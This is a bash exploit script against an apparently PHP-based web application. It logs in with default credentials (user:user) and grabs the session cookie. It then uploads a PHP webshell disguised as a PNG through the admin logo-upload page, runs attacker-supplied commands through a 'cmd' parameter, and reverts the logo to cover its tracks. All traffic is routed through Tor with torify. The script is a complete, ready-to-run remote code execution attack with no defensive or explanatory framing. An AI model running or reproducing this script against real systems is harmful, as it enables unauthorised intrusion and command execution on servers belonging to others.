echo "Log In with default user credentials (user:user)"

cookie=$(timeout 10 torify curl -i -s -X POST "$1/index.php" --data "username=user&password=user&language=fr&LoginButton=Login" | grep "Set-Cookie" |  grep -o -P '(?<=PHPSESSID=).*(?=;)')

echo "We should be logged, here the cookie : $cookie"
echo " "
echo "Let's upload a webshell"

timeout 10 torify curl -s --cookie "PHPSESSID=$cookie" -X POST "$1/admin/UploadWebsiteLogo.php" -F 'uploadImageFile=@logo-menu.php;type=image/png' -H 'Expect:' >/dev/null
echo " "
echo "Let's execute commands !!"


echo "-------Command Output----------"
timeout 10 torify curl  --cookie "PHPSESSID=$cookie" "$1/res/img/custom-logo-menu.php?cmd=$2"


echo "-------------------------------"
echo " "
echo "Cleaning..."


timeout 10 torify curl -s --cookie "PHPSESSID=$cookie" -X POST "$1/admin/RevertWebsiteLogo.php" --data "revertLogo=Envoyer"  >/dev/null
